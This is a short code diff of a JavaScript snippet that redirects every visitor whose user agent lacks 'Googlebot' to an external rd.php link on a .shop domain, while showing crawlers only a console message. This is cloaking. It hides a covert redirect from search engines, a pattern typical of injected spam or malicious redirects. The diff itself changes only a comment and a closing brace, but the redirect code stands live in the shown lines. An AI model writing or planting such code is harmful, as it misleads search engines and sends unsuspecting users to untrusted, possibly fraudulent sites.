@@ -3,5 +3,6 @@ if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
   window.location.href = "https://j5h8c.shop/3/rd.php?url=/p/IbKo";
 } else {
-  // For search engine crawlers, you can choose to perform a different action or not redirect
+  // For search engine crawlers
   console.log("THanks for visiting my page");
+}
